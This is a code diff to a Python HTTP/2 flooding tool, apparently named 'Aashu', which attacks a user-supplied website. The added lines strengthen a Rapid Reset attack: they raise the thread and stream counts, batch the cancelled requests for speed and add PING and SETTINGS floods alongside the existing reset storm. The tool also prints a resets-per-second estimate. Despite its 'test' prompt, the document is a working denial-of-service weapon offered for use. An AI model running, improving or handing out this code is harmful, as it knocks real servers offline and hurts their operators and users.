@@ -1,14 +1,15 @@
-import asyncio,random,ssl,time,sys,re,socket
+import asyncio,random,ssl,time,sys,re,socket,struct,os
 from concurrent.futures import ThreadPoolExecutor
 import h2.config,h2.connection,h2.errors,h2.events
 from cfonts import render
-Aashu1=80;Aashu2=40;Aashu3=300000;Aashu4=150;Aashu5=0.005
+try:import uvloop;asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+except:pass
+Aashu1=120;Aashu2=60;Aashu3=999999;Aashu4=0;Aashu5=0.001
 def Aashu12(p,d=None):
  v=input(p).strip()
  return v if v else d
 banner=render(' Aashu',font='block',colors=['red','white'],align='center',background='red')
 print('\x1b[1;39m━'*63);print(banner);print('\x1b[1;39m━'*63)
-import sys,time
 print('\x1b[1;96m  Enter the target you want to test.\x1b[0m')
 print('\x1b[1;93m  Examples:\x1b[0m')
 print('\x1b[1;97m    • https://example.com\x1b[0m')
@@ -60,27 +61,40 @@ class H2Conn:
     evs=self.h2.receive_data(d)
     for e in evs:
      if isinstance(e,h2.events.RemoteSettingsChanged):self.h2.acknowledge_settings(e.changed_settings)
+     elif isinstance(e,h2.events.PingAcknowledged):pass
     self.writer.write(self.h2.data_to_send());await self.writer.drain()
   except:pass
   finally:self.dead=True
  async def flood(self,count):
   headers=[(':method','GET'),(':path','/'),(':scheme','https'),(':authority',Aashu7),('user-agent','Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'),('accept','*/*'),('cache-control','no-cache'),('range',f'bytes={random.randint(0,999999)}-{random.randint(0,999999)+4096}')]
+  batch=0
   for _ in range(count):
    if self.dead:break
    sid=self.h2.get_next_available_stream_id()
    try:
-    self.h2.send_headers(sid,headers,end_stream=True);self.h2.reset_stream(sid,error_code=h2.errors.ErrorCodes.CANCEL)
-    self.writer.write(self.h2.data_to_send());await self.writer.drain();self.resets+=1
-    for __ in range(Aashu4):
-     if self.dead:break
-     try:self.h2.update_priority(sid,weight=255,depends_on=0,exclusive=True);self.writer.write(self.h2.data_to_send());await self.writer.drain()
-     except:break
+    self.h2.send_headers(sid,headers,end_stream=True)
+    self.h2.reset_stream(sid,error_code=h2.errors.ErrorCodes.CANCEL)
+    self.resets+=1
+    batch+=1
+    if batch>=50:
+     self.writer.write(self.h2.data_to_send());await self.writer.drain();batch=0
    except:break
+  if batch:self.writer.write(self.h2.data_to_send());await self.writer.drain()
+ async def ping_flood(self):
+  while not self.dead:
+   self.h2.ping(random.getrandbits(64))
+   self.writer.write(self.h2.data_to_send());await self.writer.drain();await asyncio.sleep(0.0001)
+ async def settings_flood(self):
+  toggle=False
+  while not self.dead:
+   self.h2.update_settings({1:0 if toggle else 100,3:random.randint(0,65535),4:random.randint(0,65535)})
+   self.writer.write(self.h2.data_to_send());await self.writer.drain();await asyncio.sleep(Aashu5);toggle=not toggle
  async def storm(self,duration):
   start=time.monotonic();toggle=False
   while time.monotonic()-start<duration:
    if self.dead:break
-   self.h2.update_settings({1:0 if toggle else 100});self.writer.write(self.h2.data_to_send());await self.writer.drain();await asyncio.sleep(Aashu5);toggle=not toggle
+   self.h2.update_settings({1:0 if toggle else 100})
+   self.writer.write(self.h2.data_to_send());await self.writer.drain();await asyncio.sleep(Aashu5);toggle=not toggle
  async def close(self):
   self.dead=True
   if not self.writer.is_closing():self.writer.close();await self.writer.wait_closed()
@@ -109,9 +123,9 @@ async def worker(tid):
     writer=await asyncio.start_tls(reader,writer,ssl_ctx,server_hostname=Aashu7)
    else:reader,writer=await asyncio.open_connection(Aashu7,Aashu8,ssl=ssl_ctx)
    conn=H2Conn(reader,writer);conns.append(conn)
-   flood_task=asyncio.create_task(conn.flood(Aashu3))
-   storm_task=asyncio.create_task(conn.storm(Aashu18 if Aashu18>0 else 3600))
-   tasks.extend([flood_task,storm_task])
+   tasks.append(asyncio.create_task(conn.flood(Aashu3)))
+   tasks.append(asyncio.create_task(conn.ping_flood()))
+   tasks.append(asyncio.create_task(conn.storm(Aashu18 if Aashu18>0 else 3600)))
   except Exception as e:print(f'\x1b[1;91m[WORKER {tid}]\x1b[0m \x1b[1;93mConnection error:\x1b[0m \x1b[1;97m{e}\x1b[0m');continue
  try:await asyncio.gather(*tasks)
  except:pass
@@ -124,7 +138,7 @@ async def main():
  print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mTHREADS:\x1b[0m \x1b[1;97m{Aashu1}\x1b[0m')
  print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mCONNECTIONS:\x1b[0m \x1b[1;97m{Aashu19}\x1b[0m')
  print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mPROXIES:\x1b[0m \x1b[1;97m{len(Aashu10)}\x1b[0m')
- print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mESTIMATED RATE:\x1b[0m \x1b[1;93m{Aashu19*8000} resets/second\x1b[0m')
+ print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mESTIMATED RATE:\x1b[0m \x1b[1;93m{Aashu19*12000} resets/second\x1b[0m')
  if Aashu18>0:print(f'\x1b[1;92m[+]\x1b[0m \x1b[1;96mDURATION:\x1b[0m \x1b[1;97m{Aashu18} seconds\x1b[0m')
  else:print('\x1b[1;93m[!]\x1b[0m \x1b[1;97mRUNNING UNTIL CTRL+C\x1b[0m')
  print('\n\x1b[1;93m[!]\x1b[0m \x1b[1;97mPRESS CTRL+C TO STOP\x1b[0m')
